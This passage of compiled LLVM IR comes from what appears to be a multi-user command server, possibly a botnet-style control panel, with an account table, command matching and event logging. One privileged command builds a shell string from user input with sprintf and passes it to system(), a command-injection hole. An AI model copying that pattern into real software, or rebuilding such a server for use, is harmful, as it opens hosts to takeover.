  %481 = getelementptr inbounds [800 x i8], [800 x i8]* %38, i64 0, i64 0
  %482 = call i64 @strlen(i8* %481) #8
  %483 = call i64 @send(i32 %479, i8* %480, i64 %482, i32 16384)
  %484 = icmp eq i64 %483, -1
  br i1 %484, label %485, label %486

485:                                              ; preds = %478
  br label %1137

486:                                              ; preds = %478
  %487 = load i32, i32* %4, align 4
  %488 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %489 = getelementptr inbounds [800 x i8], [800 x i8]* %39, i64 0, i64 0
  %490 = call i64 @strlen(i8* %489) #8
  %491 = call i64 @send(i32 %487, i8* %488, i64 %490, i32 16384)
  %492 = icmp eq i64 %491, -1
  br i1 %492, label %493, label %494

493:                                              ; preds = %486
  br label %1137

494:                                              ; preds = %486
  %495 = load i32, i32* %4, align 4
  %496 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %497 = getelementptr inbounds [800 x i8], [800 x i8]* %40, i64 0, i64 0
  %498 = call i64 @strlen(i8* %497) #8
  %499 = call i64 @send(i32 %495, i8* %496, i64 %498, i32 16384)
  %500 = icmp eq i64 %499, -1
  br i1 %500, label %501, label %502

501:                                              ; preds = %494
  br label %1137

502:                                              ; preds = %494
  %503 = load i32, i32* %4, align 4
  %504 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %505 = getelementptr inbounds [800 x i8], [800 x i8]* %41, i64 0, i64 0
  %506 = call i64 @strlen(i8* %505) #8
  %507 = call i64 @send(i32 %503, i8* %504, i64 %506, i32 16384)
  %508 = icmp eq i64 %507, -1
  br i1 %508, label %509, label %510

509:                                              ; preds = %502
  br label %1137

510:                                              ; preds = %502
  %511 = load i32, i32* %4, align 4
  %512 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %513 = getelementptr inbounds [800 x i8], [800 x i8]* %42, i64 0, i64 0
  %514 = call i64 @strlen(i8* %513) #8
  %515 = call i64 @send(i32 %511, i8* %512, i64 %514, i32 16384)
  %516 = icmp eq i64 %515, -1
  br i1 %516, label %517, label %518

517:                                              ; preds = %510
  br label %1137

518:                                              ; preds = %510
  %519 = load i8*, i8** %3, align 8
  %520 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %519) #9
  br label %521

521:                                              ; preds = %518
  %522 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %523 = load i32, i32* %5, align 4
  %524 = sext i32 %523 to i64
  %525 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %524
  %526 = getelementptr inbounds %struct.account, %struct.account* %525, i32 0, i32 0
  %527 = getelementptr inbounds [5000 x i8], [5000 x i8]* %526, i64 0, i64 0
  %528 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %529 = call i32 (i8*, i8*, ...) @sprintf(i8* %522, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.55, i64 0, i64 0), i8* %527, i8* %528) #9
  %530 = load i32, i32* %4, align 4
  %531 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %532 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %533 = call i64 @strlen(i8* %532) #8
  %534 = call i64 @send(i32 %530, i8* %531, i64 %533, i32 16384)
  %535 = icmp eq i64 %534, -1
  br i1 %535, label %536, label %537

536:                                              ; preds = %521
  br label %1137

537:                                              ; preds = %521
  br label %538

538:                                              ; preds = %537
  br label %368, !llvm.loop !18

539:                                              ; preds = %414
  %540 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %541 = call i8* @strstr(i8* %540, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.75, i64 0, i64 0)) #8
  %542 = icmp ne i8* %541, null
  br i1 %542, label %559, label %543

543:                                              ; preds = %539
  %544 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %545 = call i8* @strstr(i8* %544, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i64 0, i64 0)) #8
  %546 = icmp ne i8* %545, null
  br i1 %546, label %559, label %547

547:                                              ; preds = %543
  %548 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %549 = call i8* @strstr(i8* %548, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i64 0, i64 0)) #8
  %550 = icmp ne i8* %549, null
  br i1 %550, label %559, label %551

551:                                              ; preds = %547
  %552 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %553 = call i8* @strstr(i8* %552, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.78, i64 0, i64 0)) #8
  %554 = icmp ne i8* %553, null
  br i1 %554, label %559, label %555

555:                                              ; preds = %551
  %556 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %557 = call i8* @strstr(i8* %556, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.79, i64 0, i64 0)) #8
  %558 = icmp ne i8* %557, null
  br i1 %558, label %559, label %632

559:                                              ; preds = %555, %551, %547, %543, %539
  %560 = load i8*, i8** %3, align 8
  %561 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %560) #9
  %562 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %563 = call i32 (i8*, i8*, ...) @sprintf(i8* %562, i8* getelementptr inbounds ([68 x i8], [68 x i8]* @.str.80, i64 0, i64 0)) #9
  %564 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %565 = call i32 (i8*, i8*, ...) @sprintf(i8* %564, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i64 0, i64 0)) #9
  %566 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %567 = call i32 (i8*, i8*, ...) @sprintf(i8* %566, i8* getelementptr inbounds ([124 x i8], [124 x i8]* @.str.82, i64 0, i64 0)) #9
  %568 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %569 = call i32 (i8*, i8*, ...) @sprintf(i8* %568, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.83, i64 0, i64 0)) #9
  %570 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %571 = call i32 (i8*, i8*, ...) @sprintf(i8* %570, i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.81, i64 0, i64 0)) #9
  %572 = load i32, i32* %4, align 4
  %573 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %574 = getelementptr inbounds [5000 x i8], [5000 x i8]* %43, i64 0, i64 0
  %575 = call i64 @strlen(i8* %574) #8
  %576 = call i64 @send(i32 %572, i8* %573, i64 %575, i32 16384)
  %577 = icmp eq i64 %576, -1
  br i1 %577, label %578, label %579

578:                                              ; preds = %559
  br label %1137

579:                                              ; preds = %559
  %580 = load i32, i32* %4, align 4
  %581 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %582 = getelementptr inbounds [5000 x i8], [5000 x i8]* %44, i64 0, i64 0
  %583 = call i64 @strlen(i8* %582) #8
  %584 = call i64 @send(i32 %580, i8* %581, i64 %583, i32 16384)
  %585 = icmp eq i64 %584, -1
  br i1 %585, label %586, label %587

586:                                              ; preds = %579
  br label %1137

587:                                              ; preds = %579
  %588 = load i32, i32* %4, align 4
  %589 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %590 = getelementptr inbounds [5000 x i8], [5000 x i8]* %45, i64 0, i64 0
  %591 = call i64 @strlen(i8* %590) #8
  %592 = call i64 @send(i32 %588, i8* %589, i64 %591, i32 16384)
  %593 = icmp eq i64 %592, -1
  br i1 %593, label %594, label %595

594:                                              ; preds = %587
  br label %1137

595:                                              ; preds = %587
  %596 = load i32, i32* %4, align 4
  %597 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %598 = getelementptr inbounds [5000 x i8], [5000 x i8]* %46, i64 0, i64 0
  %599 = call i64 @strlen(i8* %598) #8
  %600 = call i64 @send(i32 %596, i8* %597, i64 %599, i32 16384)
  %601 = icmp eq i64 %600, -1
  br i1 %601, label %602, label %603

602:                                              ; preds = %595
  br label %1137

603:                                              ; preds = %595
  %604 = load i32, i32* %4, align 4
  %605 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %606 = getelementptr inbounds [5000 x i8], [5000 x i8]* %47, i64 0, i64 0
  %607 = call i64 @strlen(i8* %606) #8
  %608 = call i64 @send(i32 %604, i8* %605, i64 %607, i32 16384)
  %609 = icmp eq i64 %608, -1
  br i1 %609, label %610, label %611

610:                                              ; preds = %603
  br label %1137

611:                                              ; preds = %603
  %612 = load i8*, i8** %3, align 8
  %613 = call i32 @pthread_create(i64* %6, %union.pthread_attr_t* null, i8* (i8*)* @titleWriter, i8* %612) #9
  br label %614

614:                                              ; preds = %611
  %615 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %616 = load i32, i32* %5, align 4
  %617 = sext i32 %616 to i64
  %618 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %617
  %619 = getelementptr inbounds %struct.account, %struct.account* %618, i32 0, i32 0
  %620 = getelementptr inbounds [5000 x i8], [5000 x i8]* %619, i64 0, i64 0
  %621 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %622 = call i32 (i8*, i8*, ...) @sprintf(i8* %615, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.55, i64 0, i64 0), i8* %620, i8* %621) #9
  %623 = load i32, i32* %4, align 4
  %624 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %625 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %626 = call i64 @strlen(i8* %625) #8
  %627 = call i64 @send(i32 %623, i8* %624, i64 %626, i32 16384)
  %628 = icmp eq i64 %627, -1
  br i1 %628, label %629, label %630

629:                                              ; preds = %614
  br label %1137

630:                                              ; preds = %614
  br label %631

631:                                              ; preds = %630
  br label %368, !llvm.loop !18

632:                                              ; preds = %555
  %633 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %634 = call i8* @strstr(i8* %633, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.84, i64 0, i64 0)) #8
  %635 = icmp ne i8* %634, null
  br i1 %635, label %636, label %655

636:                                              ; preds = %632
  %637 = load i32, i32* %5, align 4
  %638 = sext i32 %637 to i64
  %639 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %638
  %640 = getelementptr inbounds %struct.account, %struct.account* %639, i32 0, i32 0
  %641 = getelementptr inbounds [5000 x i8], [5000 x i8]* %640, i64 0, i64 0
  %642 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %643 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i64 0, i64 0), i8* %641, i8* %642)
  %644 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.86, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %644, %struct._IO_FILE** %48, align 8
  %645 = load %struct._IO_FILE*, %struct._IO_FILE** %48, align 8
  %646 = load i32, i32* %5, align 4
  %647 = sext i32 %646 to i64
  %648 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %647
  %649 = getelementptr inbounds %struct.account, %struct.account* %648, i32 0, i32 0
  %650 = getelementptr inbounds [5000 x i8], [5000 x i8]* %649, i64 0, i64 0
  %651 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %652 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %645, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i64 0, i64 0), i8* %650, i8* %651)
  %653 = load %struct._IO_FILE*, %struct._IO_FILE** %48, align 8
  %654 = call i32 @fclose(%struct._IO_FILE* %653)
  br label %1137

655:                                              ; preds = %632
  %656 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %657 = call i8* @strstr(i8* %656, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.87, i64 0, i64 0)) #8
  %658 = icmp ne i8* %657, null
  br i1 %658, label %659, label %678

659:                                              ; preds = %655
  %660 = load i32, i32* %5, align 4
  %661 = sext i32 %660 to i64
  %662 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %661
  %663 = getelementptr inbounds %struct.account, %struct.account* %662, i32 0, i32 0
  %664 = getelementptr inbounds [5000 x i8], [5000 x i8]* %663, i64 0, i64 0
  %665 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %666 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i64 0, i64 0), i8* %664, i8* %665)
  %667 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.86, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %667, %struct._IO_FILE** %49, align 8
  %668 = load %struct._IO_FILE*, %struct._IO_FILE** %49, align 8
  %669 = load i32, i32* %5, align 4
  %670 = sext i32 %669 to i64
  %671 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %670
  %672 = getelementptr inbounds %struct.account, %struct.account* %671, i32 0, i32 0
  %673 = getelementptr inbounds [5000 x i8], [5000 x i8]* %672, i64 0, i64 0
  %674 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %675 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %668, i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.85, i64 0, i64 0), i8* %673, i8* %674)
  %676 = load %struct._IO_FILE*, %struct._IO_FILE** %49, align 8
  %677 = call i32 @fclose(%struct._IO_FILE* %676)
  br label %1137

678:                                              ; preds = %655
  %679 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %680 = call i8* @strstr(i8* %679, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.88, i64 0, i64 0)) #8
  %681 = icmp ne i8* %680, null
  br i1 %681, label %686, label %682

682:                                              ; preds = %678
  %683 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %684 = call i8* @strstr(i8* %683, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i64 0, i64 0)) #8
  %685 = icmp ne i8* %684, null
  br i1 %685, label %686, label %705

686:                                              ; preds = %682, %678
  %687 = load i32, i32* %5, align 4
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %688
  %690 = getelementptr inbounds %struct.account, %struct.account* %689, i32 0, i32 0
  %691 = getelementptr inbounds [5000 x i8], [5000 x i8]* %690, i64 0, i64 0
  %692 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %693 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([85 x i8], [85 x i8]* @.str.90, i64 0, i64 0), i8* %691, i8* %692)
  %694 = call noalias %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.91, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.30, i64 0, i64 0))
  store %struct._IO_FILE* %694, %struct._IO_FILE** %50, align 8
  %695 = load %struct._IO_FILE*, %struct._IO_FILE** %50, align 8
  %696 = load i32, i32* %5, align 4
  %697 = sext i32 %696 to i64
  %698 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %697
  %699 = getelementptr inbounds %struct.account, %struct.account* %698, i32 0, i32 0
  %700 = getelementptr inbounds [5000 x i8], [5000 x i8]* %699, i64 0, i64 0
  %701 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %702 = call i32 (%struct._IO_FILE*, i8*, ...) @fprintf(%struct._IO_FILE* %695, i8* getelementptr inbounds ([84 x i8], [84 x i8]* @.str.92, i64 0, i64 0), i8* %700, i8* %701)
  %703 = load %struct._IO_FILE*, %struct._IO_FILE** %50, align 8
  %704 = call i32 @fclose(%struct._IO_FILE* %703)
  br label %1137

705:                                              ; preds = %682
  %706 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %707 = call i8* @strstr(i8* %706, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.93, i64 0, i64 0)) #8
  %708 = icmp ne i8* %707, null
  br i1 %708, label %713, label %709

709:                                              ; preds = %705
  %710 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %711 = call i8* @strstr(i8* %710, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.94, i64 0, i64 0)) #8
  %712 = icmp ne i8* %711, null
  br i1 %712, label %713, label %724

713:                                              ; preds = %709, %705
  %714 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %715 = call i32 (i8*, i8*, ...) @sprintf(i8* %714, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.95, i64 0, i64 0)) #9
  %716 = load i32, i32* %4, align 4
  %717 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %718 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %719 = call i64 @strlen(i8* %718) #8
  %720 = call i64 @send(i32 %716, i8* %717, i64 %719, i32 16384)
  %721 = icmp eq i64 %720, -1
  br i1 %721, label %722, label %723

722:                                              ; preds = %713
  store i8* null, i8** %2, align 8
  br label %1146

723:                                              ; preds = %713
  br label %724

724:                                              ; preds = %723, %709
  %725 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %726 = call i8* @strstr(i8* %725, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.96, i64 0, i64 0)) #8
  %727 = icmp ne i8* %726, null
  br i1 %727, label %728, label %739

728:                                              ; preds = %724
  %729 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %730 = call i32 (i8*, i8*, ...) @sprintf(i8* %729, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.97, i64 0, i64 0)) #9
  %731 = load i32, i32* %4, align 4
  %732 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %733 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %734 = call i64 @strlen(i8* %733) #8
  %735 = call i64 @send(i32 %731, i8* %732, i64 %734, i32 16384)
  %736 = icmp eq i64 %735, -1
  br i1 %736, label %737, label %738

737:                                              ; preds = %728
  store i8* null, i8** %2, align 8
  br label %1146

738:                                              ; preds = %728
  br label %739

739:                                              ; preds = %738, %724
  %740 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %741 = call i8* @strstr(i8* %740, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i64 0, i64 0)) #8
  %742 = icmp ne i8* %741, null
  br i1 %742, label %743, label %754

743:                                              ; preds = %739
  %744 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %745 = call i32 (i8*, i8*, ...) @sprintf(i8* %744, i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.99, i64 0, i64 0)) #9
  %746 = load i32, i32* %4, align 4
  %747 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %748 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %749 = call i64 @strlen(i8* %748) #8
  %750 = call i64 @send(i32 %746, i8* %747, i64 %749, i32 16384)
  %751 = icmp eq i64 %750, -1
  br i1 %751, label %752, label %753

752:                                              ; preds = %743
  store i8* null, i8** %2, align 8
  br label %1146

753:                                              ; preds = %743
  br label %754

754:                                              ; preds = %753, %739
  %755 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %756 = call i8* @strstr(i8* %755, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.100, i64 0, i64 0)) #8
  %757 = icmp ne i8* %756, null
  br i1 %757, label %762, label %758

758:                                              ; preds = %754
  %759 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %760 = call i8* @strstr(i8* %759, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.101, i64 0, i64 0)) #8
  %761 = icmp ne i8* %760, null
  br i1 %761, label %762, label %804

762:                                              ; preds = %758, %754
  %763 = load i8*, i8** %12, align 8
  %764 = load i32, i32* %5, align 4
  %765 = sext i32 %764 to i64
  %766 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %765
  %767 = getelementptr inbounds %struct.account, %struct.account* %766, i32 0, i32 2
  %768 = getelementptr inbounds [5000 x i8], [5000 x i8]* %767, i64 0, i64 0
  %769 = call i32 @strcmp(i8* %763, i8* %768) #8
  %770 = icmp eq i32 %769, 0
  br i1 %770, label %771, label %792

771:                                              ; preds = %762
  %772 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %773 = call i8* @strtok(i8* %772, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i64 0, i64 0)) #9
  store i8* %773, i8** %52, align 8
  %774 = load i8*, i8** %52, align 8
  %775 = getelementptr inbounds i8, i8* %774, i64 8
  store i8* %775, i8** %53, align 8
  %776 = load i8*, i8** %53, align 8
  call void @trim(i8* %776)
  %777 = load i8*, i8** %53, align 8
  %778 = getelementptr inbounds [100 x i8*], [100 x i8*]* %51, i64 0, i64 0
  %779 = call i32 (i8*, i8**, ...) bitcast (i32 (...)* @resolve to i32 (i8*, i8**, ...)*)(i8* %777, i8** %778)
  %780 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %781 = load i8*, i8** %53, align 8
  %782 = getelementptr inbounds [100 x i8*], [100 x i8*]* %51, i64 0, i64 0
  %783 = call i32 (i8*, i8*, ...) @sprintf(i8* %780, i8* getelementptr inbounds ([62 x i8], [62 x i8]* @.str.103, i64 0, i64 0), i8* %781, i8** %782) #9
  %784 = load i32, i32* %4, align 4
  %785 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %786 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %787 = call i64 @strlen(i8* %786) #8
  %788 = call i64 @send(i32 %784, i8* %785, i64 %787, i32 16384)
  %789 = icmp eq i64 %788, -1
  br i1 %789, label %790, label %791

790:                                              ; preds = %771
  store i8* null, i8** %2, align 8
  br label %1146

791:                                              ; preds = %771
  br label %803

792:                                              ; preds = %762
  %793 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %794 = call i32 (i8*, i8*, ...) @sprintf(i8* %793, i8* getelementptr inbounds ([58 x i8], [58 x i8]* @.str.104, i64 0, i64 0)) #9
  %795 = load i32, i32* %4, align 4
  %796 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %797 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %798 = call i64 @strlen(i8* %797) #8
  %799 = call i64 @send(i32 %795, i8* %796, i64 %798, i32 16384)
  %800 = icmp eq i64 %799, -1
  br i1 %800, label %801, label %802

801:                                              ; preds = %792
  br label %802

802:                                              ; preds = %801, %792
  br label %803

803:                                              ; preds = %802, %791
  br label %804

804:                                              ; preds = %803, %758
  %805 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %806 = call i8* @strstr(i8* %805, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.105, i64 0, i64 0)) #8
  %807 = icmp ne i8* %806, null
  br i1 %807, label %812, label %808

808:                                              ; preds = %804
  %809 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %810 = call i8* @strstr(i8* %809, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.106, i64 0, i64 0)) #8
  %811 = icmp ne i8* %810, null
  br i1 %811, label %812, label %869

812:                                              ; preds = %808, %804
  %813 = load i8*, i8** %12, align 8
  %814 = load i32, i32* %5, align 4
  %815 = sext i32 %814 to i64
  %816 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %815
  %817 = getelementptr inbounds %struct.account, %struct.account* %816, i32 0, i32 2
  %818 = getelementptr inbounds [5000 x i8], [5000 x i8]* %817, i64 0, i64 0
  %819 = call i32 @strcmp(i8* %813, i8* %818) #8
  %820 = icmp eq i32 %819, 0
  br i1 %820, label %821, label %857

821:                                              ; preds = %812
  %822 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %823 = call i8* @strtok(i8* %822, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.102, i64 0, i64 0)) #9
  store i8* %823, i8** %54, align 8
  %824 = load i8*, i8** %54, align 8
  %825 = getelementptr inbounds i8, i8* %824, i64 8
  store i8* %825, i8** %55, align 8
  %826 = load i8*, i8** %55, align 8
  call void @trim(i8* %826)
  %827 = getelementptr inbounds [50 x i8*], [50 x i8*]* %56, i64 0, i64 0
  %828 = bitcast i8** %827 to i8*
  %829 = load i8*, i8** %55, align 8
  %830 = call i32 (i8*, i8*, ...) @sprintf(i8* %828, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.107, i64 0, i64 0), i8* %829) #9
  %831 = getelementptr inbounds [50 x i8*], [50 x i8*]* %56, i64 0, i64 0
  %832 = bitcast i8** %831 to i8*
  %833 = call i32 @system(i8* %832)
  %834 = load i32, i32* %5, align 4
  %835 = sext i32 %834 to i64
  %836 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %835
  %837 = getelementptr inbounds %struct.account, %struct.account* %836, i32 0, i32 0
  %838 = getelementptr inbounds [5000 x i8], [5000 x i8]* %837, i64 0, i64 0
  %839 = load i8*, i8** %55, align 8
  %840 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([86 x i8], [86 x i8]* @.str.108, i64 0, i64 0), i8* %838, i8* %839)
  %841 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %842 = load i32, i32* %5, align 4
  %843 = sext i32 %842 to i64
  %844 = getelementptr inbounds [25 x %struct.account], [25 x %struct.account]* @accounts, i64 0, i64 %843
  %845 = getelementptr inbounds %struct.account, %struct.account* %844, i32 0, i32 0
  %846 = getelementptr inbounds [5000 x i8], [5000 x i8]* %845, i64 0, i64 0
  %847 = load i8*, i8** %55, align 8
  %848 = call i32 (i8*, i8*, ...) @sprintf(i8* %841, i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.109, i64 0, i64 0), i8* %846, i8* %847) #9
  %849 = load i32, i32* %4, align 4
  %850 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %851 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %852 = call i64 @strlen(i8* %851) #8
  %853 = call i64 @send(i32 %849, i8* %850, i64 %852, i32 16384)
  %854 = icmp eq i64 %853, -1
  br i1 %854, label %855, label %856

855:                                              ; preds = %821
  store i8* null, i8** %2, align 8
  br label %1146

856:                                              ; preds = %821
  br label %868

857:                                              ; preds = %812
  %858 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %859 = call i32 (i8*, i8*, ...) @sprintf(i8* %858, i8* getelementptr inbounds ([66 x i8], [66 x i8]* @.str.110, i64 0, i64 0)) #9
  %860 = load i32, i32* %4, align 4
  %861 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %862 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %863 = call i64 @strlen(i8* %862) #8
  %864 = call i64 @send(i32 %860, i8* %861, i64 %863, i32 16384)
  %865 = icmp eq i64 %864, -1
  br i1 %865, label %866, label %867

866:                                              ; preds = %857
  br label %867

867:                                              ; preds = %866, %857
  br label %868

868:                                              ; preds = %867, %856
  br label %869

869:                                              ; preds = %868, %808
  %870 = getelementptr inbounds [2048 x i8], [2048 x i8]* %8, i64 0, i64 0
  %871 = call i8* @strstr(i8* %870, i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.111, i64 0, i64 0)) #8
  %872 = icmp ne i8* %871, null
  br i1 %872, label %873, label %884

873:                                              ; preds = %869
  %874 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %875 = call i32 (i8*, i8*, ...) @sprintf(i8* %874, i8* getelementptr inbounds ([49 x i8], [49 x i8]* @.str.112, i64 0, i64 0)) #9
  %876 = load i32, i32* %4, align 4
  %877 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %878 = getelementptr inbounds [2048 x i8], [2048 x i8]* %13, i64 0, i64 0
  %879 = call i64 @strlen(i8* %878) #8
  %880 = call i64 @send(i32 %876, i8* %877, i64 %879, i32 16384)
